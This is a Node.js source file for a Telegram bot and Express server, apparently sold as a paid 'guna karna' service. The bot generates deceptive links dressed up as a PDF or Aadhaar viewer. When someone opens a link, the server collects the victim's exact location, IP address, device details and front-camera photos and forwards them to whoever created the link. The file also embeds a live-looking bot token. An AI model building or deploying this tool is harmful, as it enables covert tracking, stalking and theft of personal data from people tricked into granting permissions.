// const express = require("express");
// const app = express();
const fs = require("fs");
const express = require("express");
var cors = require("cors");
var bodyParser = require("body-parser");
const fetch = require("node-fetch");
const TelegramBot = require("node-telegram-bot-api");
const path = require("path");
const token = "8951937812:AAH_mnb3FJwfNtUfLsWy7CnrHWejSDY9Ezw";
const bot = new TelegramBot(token, { polling: true });

const userDataPath = path.join(__dirname, "userData.json");
let userData = {};
if (fs.existsSync(userDataPath)) {
  userData = JSON.parse(fs.readFileSync(userDataPath));
} else {
  fs.writeFileSync(userDataPath, JSON.stringify(userData));
}

// Save user data to file
function saveUserData() {
  fs.writeFileSync(userDataPath, JSON.stringify(userData, null, 2));
}

// const secretCode = "karna";
// const userStates = {};

// Handle messages
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Check if the user is already in the user data
  if (!userData[chatId]) {
    // Add user with start date
    userData[chatId] = {
      startDate: new Date().toISOString(),
      status: "trial",
      secretCode: "",
    };
    saveUserData();

    bot.sendMessage(
      chatId,
      `Welcome ${msg.chat.first_name} !\nHiii..Now can use 😈guna karna😈Bot \nfree trial!\nYou have 3 days of acces press start to begin`,
    );
  } else {
    const user = userData[chatId];
    const now = new Date();
    const startDate = new Date(user.startDate);
    const diffTime = Math.abs(now - startDate);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    var m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: "Click Here to generate Link", callback_data: "crenew" }],
        ],
      }),
    };

    if (diffDays > 3 && user.status !== "active") {
      if (text === user.secretCode) {
        user.status = "active";
        saveUserData();
        bot.sendMessage(chatId, "Access granted. Thank you!");
      } else {
        bot.sendMessage(
          chatId,
          "Your trial period has ended.\n\n Please enter the secret code to continue.\n \nif you don't have code Buy code:!just..Rs 199\nUsing this link..\nhttps://bit.ly/paymentsGateway\n\nIf paid 199 Rs Then only your 3 months subscription wil activated for your telegram User ID\n\nContact Admin👉https://t.me/Karnayujoi",
        );
      }
    } else {
      bot.sendMessage(
        chatId,
        `Welcome ${msg.chat.first_name} ! , \nHiii..Now can use 😈guna karna😈bot \nIt can gather informations like \nExact location 📍,\nDevice info📱,\nIp Address 🕵️, \nFront Camera snaps 📷..\n𓆩🖤𓆪
              \nif you want to know how to use click /help for more info.`,
        m,
      );
      if (msg?.reply_to_message?.text == "🖇️ Enter Your URL Link") {
        createLink(chatId, msg.text);
      }
    }
  }
});

var jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: "application/json",
});
var urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: "application/x-www-form-urlencoded",
});
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL =
  "https://click-allow-to-view-pdfviewer-permission.onrender.com";
//TOGGLE for Shorters
var use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (req.params.path != null) {
    res.render("webview", {
      ip: ip,
      time: d,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt,
    });
  } else {
    res.redirect("https://www.google.com/");
  }
});

app.get("/", (req, res) => {
  res.send('<h1 align="center">Karna Server Activated GK</h1>');
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (req.params.path != null) {
    res.render("Adharview", {
      ip: ip,
      time: d,
      url: atob(req.params.uri),
      uid: req.params.path,
      a: hostURL,
      t: use1pt,
    });
  } else {
    res.redirect("https://www.google.com/");
  }
});

bot.on("callback_query", async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});
bot.on("polling_error", (error) => {
  //console.log(error.code);
});

async function createLink(cid, msg) {
  var encoded = [...msg].some((char) => char.charCodeAt(0) > 127);

  if (
    (msg.toLowerCase().indexOf("http") > -1 ||
      msg.toLowerCase().indexOf("https") > -1) &&
    !encoded
  ) {
    var url = cid.toString(36) + "/" + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: "Create new Link Again", callback_data: "crenew" }],
        ],
      }),
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(
        `https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`,
      ).then((res) => res.json());
      var y = await fetch(
        `https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`,
      ).then((res) => res.json());

      var f = "",
        g = "";

      for (var c in x) {
        f += x[c] + "\n";
      }

      for (var c in y) {
        g += y[c] + "\n";
      }

      bot.sendMessage(
        cid,
        `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n👑 Links Ready 😈guna karna😈\n\n🔗 Send this below 👇 Link to whom u want send\n${f}\n\n🔗 WebView Page Link\n${g}`,
        m,
      );
    } else {
      bot.sendMessage(
        cid,
        `New links has been created successfully.\nURL: ${msg}\n\n👑 Links Ready 😈guna karna😈\n\n🔗 Send this below 👇 Link to whom u want send\n${cUrl}\n\n🔗 WebView Page Link\n${wUrl}`,
        m,
      );
    }
  } else {
    bot.sendMessage(
      cid,
      `⚠️ Please Enter a valid URL to send  , Link need to have starting http or https.`,
    );
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ force_reply: true }),
  };
  bot.sendMessage(cid, `🖇️ Enter Your URL Link`, mk);
}

app.get("/", (req, res) => {
  var ip;
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  res.json({ ip: ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);

    bot.sendMessage(
      parseInt(uid, 36),
      `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters gk`,
    );

    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");

    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });

    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {
    var buffer = Buffer.from(img, "base64");

    var info = {
      filename: "camsnap.png",
      contentType: "image/png",
    };

    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }

    res.send("Done");
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
